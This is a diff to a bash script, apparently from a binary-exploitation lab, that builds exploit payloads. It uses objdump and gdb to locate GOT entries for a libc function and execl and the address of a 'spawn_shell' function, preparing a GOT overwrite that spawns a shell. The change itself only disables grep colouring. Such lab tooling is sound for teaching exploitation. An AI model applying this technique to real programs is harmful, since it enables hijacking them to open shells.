@@ -3,6 +3,7 @@
 # Construct payloads
 
 usage="Usage: $0 <executable> <library-fn-name> <item-buffer-bound>"
+grepnc="grep --color=never"
 
 # Check number of parameters
 if [[ "$#" -ne 3 ]]; then
@@ -19,24 +20,24 @@ execfn="execl"
 spawnfn="spawn_shell"
 
 # Find address of libc library function to be overwritten
-libaddrline=(`objdump --dynamic-reloc $binname | grep $libfn`)
+libaddrline=(`objdump --dynamic-reloc $binname | $grepnc $libfn`)
 echo "Address of $libfn@got.plt: 0x$libaddrline"
 
 # Find address of execl
-execaddrline=(`objdump --dynamic-reloc $binname | grep $execfn`)
+execaddrline=(`objdump --dynamic-reloc $binname | $grepnc $execfn`)
 distance=$((0x$execaddrline - 0x$libaddrline))
 echo "Offset to $execfn@got.plt: $distance"
 let distance=$(($distance / 8))
 
 # Find table entry of execl
 echo -n "x/2gx 0x$execaddrline" > comms1
-execloc=(`gdb $binname < comms1 | grep "<$execfn@got\.plt>"`)
+execloc=(`gdb $binname < comms1 | $grepnc "<$execfn@got\.plt>"`)
 execloc=(`echo ${execloc[3]} | cut -f2 -d "x"`)
 echo "Location of $execfn@got.plt: 0x$execloc"
 
 # Find address of shell-spawning function
 echo -n "p $spawnfn" > comms2
-spawnaddrline=(`gdb $binname < comms2 | grep "0x[0-9a-fA-F]\{6,8\}"`)
+spawnaddrline=(`gdb $binname < comms2 | $grepnc "0x[0-9a-fA-F]\{6,8\}"`)
 salindex=0
 for i in "${!spawnaddrline[@]}"; do
 	if [[ ${spawnaddrline[$i]} == "<$spawnfn>" ]]; then
